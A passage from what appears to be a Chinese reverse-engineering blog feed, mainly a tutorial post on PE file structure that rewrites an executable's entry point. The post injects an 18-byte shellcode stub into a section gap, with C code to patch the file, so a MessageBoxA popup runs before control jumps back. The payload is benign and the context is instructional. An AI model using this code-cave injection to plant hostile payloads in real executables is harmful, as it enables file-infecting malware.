xxxxx</span><br>DWORD e8_x_addr = MessageBox_Addr - (FOA_TO_RVA(e9_FOA,NewBuffer)+ImgaeBase);<br><span class="hljs-comment">//计算原oep的地址编码 即e9 xxxxx</span><br>DWORD e9_x_addr = OptionalHeader-&gt;AddressOfEntryPoint - (FOA_TO_RVA(e9_FOA,NewBuffer)+<span class="hljs-number">5</span>);<br><br><span class="hljs-comment">//先修改原OEP</span><br>OptionalHeader-&gt;AddressOfEntryPoint = NewSection-&gt;VirtualAddress;<br>    <span class="hljs-comment">// OptionalHeader-&gt;AddressOfEntryPoint = 0x5DEFC;</span><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%X&quot;</span>,FOA_TO_RVA(begin_FOA,NewBuffer));<br><br>    <span class="hljs-built_in">memcpy</span>(shell_begin,Shell,<span class="hljs-number">18</span>);<br><br><span class="hljs-comment">//这里要注意memcpy的用法</span><br>DWORD* e8 = (DWORD*)(shell_begin + <span class="hljs-number">9</span>);<br>DWORD* e9 = (DWORD*)(shell_begin + <span class="hljs-number">14</span>);<br><span class="hljs-built_in">memcpy</span>(e8,&amp;e8_x_addr,<span class="hljs-number">4</span>);<span class="hljs-comment">//这里也可能是1，把4改为1</span><br><span class="hljs-built_in">memcpy</span>(e9,&amp;e9_x_addr,<span class="hljs-number">4</span>);<br><br><br>    <span class="hljs-keyword">return</span> NewBuffer;<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span>&#123;<br>    <span class="hljs-type">char</span>* buffer;<br>    <span class="hljs-type">char</span>* new_buffer;<br><br>    FILE* fp1 = <span class="hljs-literal">NULL</span>;<br>    FILE* fp2 = <span class="hljs-literal">NULL</span>;<br>    <br>    <span class="hljs-type">errno_t</span> err_1 = fopen_s(&amp;fp1, <span class="hljs-string">&quot;C:\\Users\\yongrin\\Desktop\\PE_info.exe&quot;</span>, <span class="hljs-string">&quot;rb&quot;</span>);<br>    <span class="hljs-type">errno_t</span> err_2 = fopen_s(&amp;fp2, <span class="hljs-string">&quot;C:\\Users\\yongrin\\Desktop\\PE_info_shell.exe&quot;</span>, <span class="hljs-string">&quot;wb&quot;</span>);<br><br>    DWORD size = Size(fp1);<br>    buffer = (<span class="hljs-type">char</span>*)<span class="hljs-built_in">malloc</span>(size);<br>    fread(buffer,size,<span class="hljs-number">1</span>,fp1);<br><br>    new_buffer = Section_add(fp1,buffer);<br>    fwrite(new_buffer,size+<span class="hljs-number">0x1000</span>+<span class="hljs-number">0x100</span>,<span class="hljs-number">1</span>,fp2);<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;   <br>&#125;<br><br><br><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>Reverse</category>
      
      <category>PE</category>
      
    </categories>
    
    
    <tags>
      
      <tag>reverse</tag>
      
      <tag>PE</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>PE文件结构（四）</title>
    <link href="/2023/07/02/PE_3/"/>
    <url>/2023/07/02/PE_3/</url>
    
    <content type="html"><![CDATA[<p>PE练习，修改OEP执行shellcode</p><span id="more"></span><h2 id="回顾"><a href="#回顾" class="headerlink" title="回顾"></a>回顾</h2><p>在可选PE头OptionalHeader中有这样一个成员<code>AddressOfEntryPoint</code>,这个成员记录整个exe程序开始入口地址，而且是一个RVA，即虚拟相对地址，需要将其加上程序装载的基址即ImageBase才是在内存中真正运行的地址。</p><p>那么自然就有一种想法，能否通过修改这个OEP，在程序执行之前先执行其他代码，然后再执行源代码？</p><h2 id="练习"><a href="#练习" class="headerlink" title="练习"></a>练习</h2><h3 id="要求"><a href="#要求" class="headerlink" title="要求"></a>要求</h3><p>1.通过修改OEP，在程序执行前执行一个弹窗</p><p><img src="https://yring-me.oss-cn-beijing.aliyuncs.com/test/202307021658762.png"></p><p>2.弹窗后恢复正常执行流</p><h3 id="需要解决的问题"><a href="#需要解决的问题" class="headerlink" title="需要解决的问题"></a>需要解决的问题</h3><p>Q1：弹窗函数在哪里</p><p>A1：可以先使用OD等调试工具装载exe文件，在调试工具里面找到弹窗函数MessageBoxA</p><p>函数原型</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">MessageBoxA</span><span class="hljs-params">( HWND hWnd,LPCTSTR lpText, LPCTSTR lpCaption = <span class="hljs-literal">NULL</span>, UINT nType = MB_OK )</span>;<br></code></pre></td></tr></table></figure><p>参数说明</p><blockquote><p>hWnd：表示窗口句柄，指定该对话框的所有者窗口；如果该参数为空(0&#x2F;NULL)，则该对话框不属于任何窗口<br>lpText：字符串，指显示在对话框中的内容<br>lpCaption：字符串，指对话框的标题；如果此参数为空，则默认使用“错误”作为标题<br>nType：指定显示按钮的数目及形式，表名使用的图标样式、缺省按钮是什么、以及消息框的强制回应等</p></blockquote><p>Q2：如何调用</p><p>A2：MessageBoxA有四个参数，通过栈来传递参数，简单起见，只需要连续的四个<code>push 0</code>即可，在push完后，就应该使用call指令调用这个函数，类似于<code>call x</code>。然而注意的是，这里的x并不是在调试工具里找到MessageBoxA的地址，而是找到的地址减去call指令的下一条地址。</p><p>举个例子，比如call指令地址是0x1000，下一条指令地址是0x1005（call指令占5个字节长度），需要call的函数地址位置为0x1105，那么就应该写为<code>call 0x100</code>，这里的100就是0x1105 - 0x1005得到。</p><p>由于是在文件里面进行修改，这里修改的就是机器码，<code>push 0</code>的机器码是<code>6A 00</code>，<code>call x</code>的机器码是<code>e8 x</code>，其中x占四个字节，e8即为call的操作码</p><p>Q3：如何返回</p><p>A3：在call完MessageBoxA后，就应该返回原来的正常执行流，那么可以在call指令下一条使用jmp指令直接跳回原来的OEP，格式为<code>jmp x</code>，同样的，这里的x也是jmp下一条指令地址减去要跳转的指令地址，x也为四字节，机器码格式为<code>e9 x</code>，e9即为jmp的操作码</p><p>Q4：在哪里插入shellcode</p><p>A4：理想的插入位置就是Code区或者Text区，因为这两个地方存放的就是代码片段，实际上任何地方都可以（得是空白段，即不能影响原来的代码），只要相应的地方拥有执行权限即可。</p><p>根据Q2，Q3，Q4可以插入对应的shellcode雏形</p><p><img src="https://yring-me.oss-cn-beijing.aliyuncs.com/test/202307021731085.png"></p><p>Q5：如何修改原来的OEP，使其执行shellcode</p><p>A5：OEP存储的是RVA，也就是在内存中偏移，那么就需要从文件偏移计算内存偏移，也就是涉及到RVA和FOA的互相转化。值得一提的是，这里的RVA和FOA其实只会对节区以后的数据有影响，所有的头其实都是不变的，因为这些头之间都是紧紧挨在一起的，中间没有填充。</p><p>那么给出一个FOA，如何计算它的RVA呢。实际上只需要确定它在哪一个节区，减去这个节区的起始地址，算出它在节区中的偏移offset，再加上节区在内存中的起始地址即可算出在内存中的地址。确定节区也好办，只需要大于此节区开始地址<code>VirtualAddress</code>，小于下一个节区开始地址，就可以确定它是在此节区中。</p><p>从RVA计算FOA也是一样的，确定节区，算节区偏移，加上节区在文件中起始地址<code>PointerToRawData</code>，给出代码实现</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;malloc.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;windows.h&gt;</span></span><br><br><br>DWORD <span class="hljs-title function_">Size</span><span class="hljs-params">(FILE* fp)</span>&#123;<br>    DWORD size = <span class="hljs-number">0</span>;<br>    fseek(fp,<span class="hljs-number">0</span>,SEEK_END);<br>    size = ftell(fp);<br>    fseek(fp,<span class="hljs-number">0</span>,SEEK_SET);<br>    <span class="hljs-keyword">return</span> size;<br>&#125;<br><br><br>DWORD <span class="hljs-title function_">FOA_TO_RVA</span><span class="hljs-params">(DWORD FOA,<span class="hljs-type">char</span>* Buffer)</span>&#123;<br>   PIMAGE_DOS_HEADER DosHeader = <span class="hljs-literal">NULL</span>;<br>    PIMAGE_NT_HEADERS NTHeader = <span class="hljs-literal">NULL</span>;<br>    PIMAGE_FILE_HEADER FileHeader= <span class="hljs-literal">NULL</span>;<br>    PIMAGE_OPTIONAL_HEADER OptionalHeader = <span class="hljs-literal">NULL</span>;<br>    PIMAGE_SECTION_HEADER SectionHeader = <span class="hljs-literal">NULL</span>;<br><br>    DosHeader = (PIMAGE_DOS_HEADER)Buffer;<br>    FileHeader = (PIMAGE_FILE_HEADER)(Buffer + DosHeader-&gt;e_lfanew + <span class="hljs-number">4</span>);<br>    OptionalHeader = (PIMAGE_OPTIONAL_HEADER)(Buffer + DosHeader-&gt;e_lfanew + <span class="hljs-number">4</span> +IMAGE_SIZEOF_FILE_HEADER);<br>    SectionHeader = (PIMAGE_SECTION_HEADER)(Buffer + DosHeader-&gt;e_lfanew + <span class="hljs-number">4</span> +IMAGE_SIZEOF_FILE_HEADER + FileHeader-&gt;SizeOfOptionalHeader);<br><br><span class="hljs-keyword">if</span> (FOA &lt; OptionalHeader-&gt;SizeOfHeaders) <span class="hljs-comment">//头部地址直接返回</span><br>&#123;<br><span class="hljs-keyword">return</span> FOA;<br>&#125;<br><br>   <br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i =<span class="hljs-number">0</span>;i&lt;FileHeader-&gt;NumberOfSections<span class="hljs-number">-1</span>;i++)&#123; <span class="hljs-comment">//节区判定条件</span><br>        <span class="hljs-keyword">if</span>(FOA &gt;= SectionHeader-&gt;PointerToRawData&amp;&amp; FOA &lt; (SectionHeader +<span class="hljs-number">1</span>)-&gt;PointerToRawData)&#123;<br>            DWORD offset = FOA - SectionHeader-&gt;PointerToRawData;<br>            <span class="hljs-keyword">return</span> SectionHeader-&gt;VirtualAddress + offset;<br>        &#125;<br>        <span class="hljs-keyword">else</span>&#123;<br>            SectionHeader += <span class="hljs-number">1</span>;<br>        &#125;<br>    &#125;<br>    <span class="hljs-comment">//最后一个节区</span><br>    DWORD offset = FOA - SectionHeader-&gt;PointerToRawData;<br>    <span class="hljs-keyword">return</span> SectionHeader-&gt;VirtualAddress + offset;<br>&#125;<br><br>DWORD <span class="hljs-title function_">RVA_TO_FOA</span><span class="hljs-params">(DWORD RVA,<span class="hljs-type">char</span>* Buffer)</span>&#123;<br>   PIMAGE_DOS_HEADER DosHeader = <span class="hljs-literal">NULL</span>;<br>PIMAGE_NT_HEADERS NTHeader = <span class="hljs-literal">NULL</span>;<br>PIMAGE_FILE_HEADER FileHeader = <span class="hljs-literal">NULL</span>;<br>PIMAGE_OPTIONAL_HEADER OptionalHeader = <span class="hljs-literal">NULL</span>;<br>PIMAGE_SECTION_HEADER SectionHeader = <span class="hljs-literal">NULL</span>;<br><br>DosHeader = (PIMAGE_DOS_HEADER)Buffer;<br>    FileHeader = (PIMAGE_FILE_HEADER)(Buffer + DosHeader-&gt;e_lfanew + <span class="hljs-number">4</span>);<br>OptionalHeader = (PIMAGE_OPTIONAL_HEADER)(Buffer + DosHeader-&gt;e_lfanew + <span class="hljs-number">4</span> + IMAGE_SIZEOF_FILE_HEADER);<br>SectionHeader = (PIMAGE_SECTION_HEADER)(Buffer + DosHeader-&gt;e_lfanew + <span class="hljs-number">4</span> + IMAGE_SIZEOF_FILE_HEADER + FileHeader-&gt;SizeOfOptionalHeader);<br>    <br>    <span class="hljs-keyword">if</span> (RVA &lt; OptionalHeader-&gt;SizeOfHeaders) <span class="hljs-comment">//头部直接返回</span><br>&#123;<br><span class="hljs-keyword">return</span> RVA;<br>&#125;<br><br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;FileHeader-&gt;NumberOfSections<span class="hljs-number">-1</span>;i++)&#123;<span class="hljs-comment">//节区判断条件</span><br>        <span class="hljs-keyword">if</span>(RVA &gt;= SectionHeader-&gt;VirtualAddress &amp;&amp; RVA &lt; (SectionHeader+<span class="hljs-number">1</span>)-&gt;VirtualAddress)&#123;<br>            DWORD offset = RVA - SectionHeader-&gt;VirtualAddress;<br>            <span class="hljs-keyword">return</span> SectionHeader-&gt;PointerToRawData + offset;<br>        &#125;<br>        <span class="hljs-keyword">else</span>&#123;<br>            SectionHeader +=<span class="hljs-number">1</span>;<br>        &#125;<br>    &#125;<br><br>     <span class="hljs-comment">//最后一个节区</span><br>    DWORD offset = RVA - SectionHeader-&gt;VirtualAddress;<br>    <span class="hljs-keyword">return</span> SectionHeader-&gt;PointerToRawData + offset;<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span>&#123;<br>    <span class="hljs-type">char</span>* buffer;<br><br>    FILE* fp1 = <span class="hljs-literal">NULL</span>;<br>    <span class="hljs-type">errno_t</span> err_1 = fopen_s(&amp;fp1, <span class="hljs-string">&quot;C:\\Users\\yongrin\\Desktop\\PE_info.exe&quot;</span>, <span class="hljs-string">&quot;rb&quot;</span>);<br><br>    DWORD size = Size(fp1);<br>    buffer = (<span class="hljs-type">char</span>*)<span class="hljs-built_in">malloc</span>(size);<br>    fread(buffer,size,<span class="hljs-number">1</span>,fp1);<br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%X&quot;</span>,FOA_TO_RVA(<span class="hljs-number">0x5d380</span>,buffer));<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%X&quot;</span>,RVA_TO_FOA(<span class="hljs-number">0x5df80</span>,buffer));<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;   <br>&#125;<br></code></pre></td></tr></table></figure><h3 id="计算地址"><a href="#计算地址" class="headerlink" title="计算地址"></a>计算地址</h3><h4 id="真正ImageBase"><a href="#真正ImageBase" class="headerlink" title="真正ImageBase"></a>真正ImageBase</h4><p>由于设备等原因，程序并不一定会加载到ImageBase的地方，这时就需要判断程序会加载到什么基址上。最好的办法就是使用调试工具，程序就会自动断在OEP处。</p><p><img src="https://yring-me.oss-cn-beijing.aliyuncs.com/test/202307021751427.png"></p><p>此时的OEP地址为0x6DEFC，是用PE查看器或者自己手动找文件中的OEP，就是可选头的<code>AddressOfEntryPoint</code>字段可得0x5DEFC，那么很显然，真正的ImageBase就是0x10000。</p><h4 id="修改OEP"><a href="#修改OEP" class="headerlink" title="修改OEP"></a>修改OEP</h4><p>shellcode在文件中起始地址是0x5D380，转化为RVA可得0x5DF80，那么只需要把OEP改写为0x5DF80即可，修改完再拖入调试器应该是这样的，可以从中看见插入的shellcode，下一步就是计算偏移</p><p><img src="https://yring-me.oss-cn-beijing.aliyuncs.com/test/202307021804821.png"></p><p>函数MessageBoxA在内存中地址是0x75B23D90（可以通过符号查看等方式找，此函数在user32.dll里，不同设备这个值也会不同），那么计算call的地址就是要跳转的地址 - 下一条指令地址，具体计算就是<code>0x75B23D90 - 0x6DF8D = 0x75AB5E03 </code>，同理jmp的地址<code>0x6DEFC - 0x6DF92 =0xffffff6a </code>（要jmp的地址是原来的OEP)</p><p>因此在文件中改为</p><p><img src="https://yring-me.oss-cn-beijing.aliyuncs.com/test/202307021807664.png"></p><p>在调试器中为，成功显示相关函数！</p><p><img src="https://yring-me.oss-cn-beijing.aliyuncs.com/test/202307021809257.png"></p><p>此时也能按照预期的方式去运行，即先弹窗再正常执行</p><h3 id="代码实现"><a href="#代码实现" class="headerlink" title="代码实现"></a>代码实现</h3><p>用到了以前的几个函数</p><p>定义了ImageBase 的宏 以及 MessageBox的宏</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;malloc.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;windows.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> ImgaeBase  0x10000</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MessageBox_Addr 0x75C93D90</span><br>BYTE Shell[] = &#123;<span class="hljs-number">0x6A</span>,<span class="hljs-number">0x00</span>,<span class="hljs-number">0x6A</span>,<span class="hljs-number">0x00</span>,<span class="hljs-number">0x6A</span>,<span class="hljs-number">0x00</span>,<span class="hljs-number">0x6A</span>,<span class="hljs-number">0x00</span>,<br>           <span class="hljs-number">0xE8</span>,<span class="hljs-number">0x00</span>,<span class="hljs-number">0x00</span>,<span class="hljs-number">0x00</span>,<span class="hljs-number">0x00</span>,<br>           <span class="hljs-number">0xe9</span>,<span class="hljs-number">0x00</span>,<span class="hljs-number">0x00</span>,<span class="hljs-number">0x00</span>,<span class="hljs-number">0x00</span>&#125;;<br><br>DWORD <span class="hljs-title function_">Size</span><span class="hljs-params">(FILE* fp)</span>&#123;<br>    DWORD size = <span class="hljs-number">0</span>;<br>    fseek(fp,<span class="hljs-number">0</span>,SEEK_END);<br>    size = ftell(fp);<br>    fseek(fp,<span class="hljs-number">0</span>,SEEK_SET);<br>    <span class="hljs-keyword">return</span> size;<br>&#125;<br><br>DWORD <span class="hljs-title function_">FOA_TO_RVA</span><span class="hljs-params">(DWORD FOA,<span class="hljs-type">char</span>* Buffer)</span>&#123;<br>   PIMAGE_DOS_HEADER DosHeader = <span class="hljs-literal">NULL</span>;<br>    PIMAGE_NT_HEADERS NTHeader = <span class="hljs-literal">NULL</span>;<br>    PIMAGE_FILE_HEADER FileHeader= <span class="hljs-literal">NULL</span>;<br>    PIMAGE_OPTIONAL_HEADER OptionalHeader = <span class="hljs-literal">NULL</span>;<br>    PIMAGE_SECTION_HEADER SectionHeader = <span class="hljs-literal">NULL</span>;<br><br>    DosHeader = (PIMAGE_DOS_HEADER)Buffer;<br>    FileHeader = (PIMAGE_FILE_HEADER)(Buffer + DosHeader-&gt;e_lfanew + <span class="hljs-number">4</span>);<br>    OptionalHeader = (PIMAGE_OPTIONAL_HEADER)(Buffer + DosHeader-&gt;e_lfanew + <span class="hljs-number">4</span> +IMAGE_SIZEOF_FILE_HEADER);<br>    SectionHeader = (PIMAGE_SECTION_HEADER)(Buffer + DosHeader-&gt;e_lfanew + <span class="hljs-number">4</span> +IMAGE_SIZEOF_FILE_HEADER + FileHeader-&gt;SizeOfOptionalHeader);<br><br><span class="hljs-keyword">if</span> (FOA &lt; OptionalHeader-&gt;SizeOfHeaders)<br>&#123;<br><span class="hljs-keyword">return</span> FOA;<br>&#125;<br><br>   <br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i =<span class="hljs-number">0</span>;i&lt;FileHeader-&gt;NumberOfSections<span class="hljs-number">-1</span>;i++)&#123;<br>        <span class="hljs-keyword">if</span>(FOA &gt;= SectionHeader-&gt;PointerToRawData&amp;&amp; FOA &lt; (SectionHeader +<span class="hljs-number">1</span>)-&gt;PointerToRawData)&#123;<br>            DWORD offset = FOA - SectionHeader-&gt;PointerToRawData;<br>            <span class="hljs-keyword">return</span> SectionHeader-&gt;VirtualAddress + offset;<br>        &#125;<br>        <span class="hljs-keyword">else</span>&#123;<br>            SectionHeader += <span class="hljs-number">1</span>;<br>        &#125;<br>    &#125;<br>    <span class="hljs-comment">//最后一个节区</span><br>    SectionHeader +=<span class="hljs-number">1</span>;<br>    DWORD offset = FOA - SectionHeader-&gt;PointerToRawData;<br>    <span class="hljs-keyword">return</span> SectionHeader-&gt;VirtualAddress + offset;<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">Shell_add</span><span class="hljs-params">(<span class="hljs-type">char</span>* buffer)</span>&#123;<br>    PIMAGE_DOS_HEADER DosHeader = <span class="hljs-literal">NULL</span>;<br>PIMAGE_NT_HEADERS NTHeader = <span class="hljs-literal">NULL</span>;<br>PIMAGE_FILE_HEADER FileHeader = <span class="hljs-literal">NULL</span>;<br>PIMAGE_OPTIONAL_HEADER OptionalHeader = <span class="hljs-literal">NULL</span>;<br>PIMAGE_SECTION_HEADER SectionHeader = <span class="hljs-literal">NULL</span>;<br><br>    DosHeader = (PIMAGE_DOS_HEADER)buffer;<br>NTHeader = (PIMAGE_NT_HEADERS)(buffer + DosHeader-&gt;e_lfanew);<br>FileHeader = (PIMAGE_FILE_HEADER)(buffer + DosHeader-&gt;e_lfanew + <span class="hljs-number">4</span>);<br>OptionalHeader = (PIMAGE_OPTIONAL_HEADER)(buffer + DosHeader-&gt;e_lfanew + <span class="hljs-number">4</span> + IMAGE_SIZEOF_FILE_HEADER);<br>SectionHeader = (PIMAGE_SECTION_HEADER)(buffer + DosHeader-&gt;e_lfanew + <span class="hljs-number">4</span> + IMAGE_SIZEOF_FILE_HEADER + FileHeader-&gt;SizeOfOptionalHeader);<br><br>    <span class="hljs-type">char</span>* shell_begin = buffer + SectionHeader-&gt;PointerToRawData + SectionHeader-&gt;Misc.VirtualSize ;<br><br>DWORD begin_FOA = SectionHeader-&gt;PointerToRawData + SectionHeader-&gt;Misc.VirtualSize;<br><br><br>DWORD e8_FOA = begin_FOA + <span class="hljs-number">8</span>;<br>DWORD e9_FOA = e8_FOA + <span class="hljs-number">5</span>;<br><br>DWORD begin_RVA = FOA_TO_RVA(begin_FOA,buffer);<br><span class="hljs-comment">//计算call地址的编码 即e8 xxxxx</span><br>DWORD e8_x_addr = MessageBox_Addr - (FOA_TO_RVA(e9_FOA,buffer)+ImgaeBase);<br><span class="hljs-comment">//计算原oep的地址编码 即e9 xxxxx</span><br>DWORD e9_x_addr = OptionalHeader-&gt;AddressOfEntryPoint - (FOA_TO_RVA(e9_FOA,buffer)+<span class="hljs-number">5</span>);<br><br><span class="hljs-comment">//先修改原OEP</span><br>OptionalHeader-&gt;AddressOfEntryPoint = FOA_TO_RVA(begin_FOA,buffer);<br><br>    <span class="hljs-built_in">memcpy</span>(shell_begin,Shell,<span class="hljs-number">18</span>);<br><br><span class="hljs-comment">//这里要注意memcpy的用法</span><br>DWORD* e8 = (DWORD*)(shell_begin + <span class="hljs-number">9</span>);<br>DWORD* e9 = (DWORD*)(shell_begin + <span class="hljs-number">14</span>);<br><span class="hljs-built_in">memcpy</span>(e8,&amp;e8_x_addr,<span class="hljs-number">4</span>);<span class="hljs-comment">//这里也可能是1，把4改为1</span><br><span class="hljs-built_in">memcpy</span>(e9,&amp;e9_x_addr,<span class="hljs-number">4</span>);<br>&#125;<br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span>&#123;<br>    <span class="hljs-type">char</span>* buffer;<br>    <span class="hljs-type">char</span>* new_buffer;<br><br>    FILE* fp1 = <span class="hljs-literal">NULL</span>;<br>    FILE* fp2 = <span class="hljs-literal">NULL</span>;<br>    <br>    <span class="hljs-type">errno_t</span> err_1 = fopen_s(&amp;fp1, <span class="hljs-string">&quot;C:\\Users\\yongrin\\Desktop\\PE_info.exe&quot;</span>, <span class="hljs-string">&quot;rb&quot;</span>);<br>    <span class="hljs-type">errno_t</span> err_2 = fopen_s(&amp;fp2, <span class="hljs-string">&quot;C:\\Users\\yongrin\\Desktop\\PE_info_shell.exe&quot;</span>, <span class="hljs-string">&quot;wb&quot;</span>);<br><br>    DWORD size = Size(fp1);<br>    buffer = (<span class="hljs-type">char</span>*)<span class="hljs-built_in">malloc</span>(size);<br>    fread(buffer,size,<span class="hljs-number">1</span>,fp1);<br><br>    Shell_add(buffer);<br>    fwrite(buffer,size,<span class="hljs-number">1</span>,fp2);<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;   <br>&#125;<br></code></pre></td></tr></table></figure><h3 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h3><p>1.也可以直接拉伸成ImageBuffer后再patch，都是一样</p><p>2.也可以在IDA里面直接patch，构造几个简单ROP即可</p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>Reverse</category>
      
      <category>PE</category>
      
    </categories>
    
    
    <tags>
      
      <tag>reverse</tag>
      
      <tag>PE</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>PE文件结构（三）</title>
    <link href="/2023/07/02/PE_2/"/>
    <url>/2023/07/02/PE_2/</url>
    
